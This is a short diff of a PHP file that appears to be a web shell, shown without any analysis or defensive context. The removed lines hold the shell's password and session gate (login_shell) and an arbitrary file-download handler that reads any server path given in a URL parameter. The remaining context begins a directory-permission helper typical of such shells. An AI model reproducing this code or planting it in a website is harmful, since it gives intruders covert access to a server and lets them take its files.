@@ -28,29 +28,6 @@
 	</body>
 </html>
 <?php
-exit;
-}
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
-	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-else
-login_shell();
-if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['aksi'] == 'download')) {
-	@ob_clean();
-	$file = $_GET['file'];
-	header('Content-Description: File Transfer');
-	header('Content-Type: application/octet-stream');
-	header('Content-Disposition: attachment; filename="'.basename($file).'"');
-	header('Expires: 0');
-	header('Cache-Control: must-revalidate');
-	header('Pragma: public');
-	header('Content-Length: ' . filesize($file));
-	readfile($file);
-	exit;
-}
-/*Akhir login*/
-?>
-<?php
 	function w($dir,$perm) {
 		if(!is_writable($dir)) {
 			return "<font color=red>".$perm."</font>";
